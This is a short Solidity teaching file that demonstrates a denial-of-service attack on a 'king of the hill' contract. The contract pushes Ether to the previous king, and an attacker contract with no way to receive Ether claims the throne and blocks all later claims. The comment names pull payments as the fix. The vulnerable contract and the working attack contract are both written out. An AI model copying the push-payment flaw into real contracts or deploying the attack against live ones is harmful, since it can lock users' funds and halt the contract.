// SPDX-License-Identifier: MIT

/*
Denial of Service attack by rejecting to accept Ether
Prevent this type of attack by push vs pull method
 */
pragma solidity ^0.8.0;

contract BecomeKing {
    uint256 public balance;
    address public king;

    function claimThrone() external payable {
        
        require(msg.value > balance, "Send More ether!");

        (bool sent, ) = king.call{value : balance}("");
        require(sent, "Transaction failed");

        king = msg.sender;
        balance = msg.value;
    }
}

contract DOSAttack {
    // Once this contract is set to king you can see it has no function like receive or fallback
    // to accept ether so transaction will always fail thus denying of service

    function attack(BecomeKing king) external payable {
        king.claimThrone{value : msg.value}();
    }
}

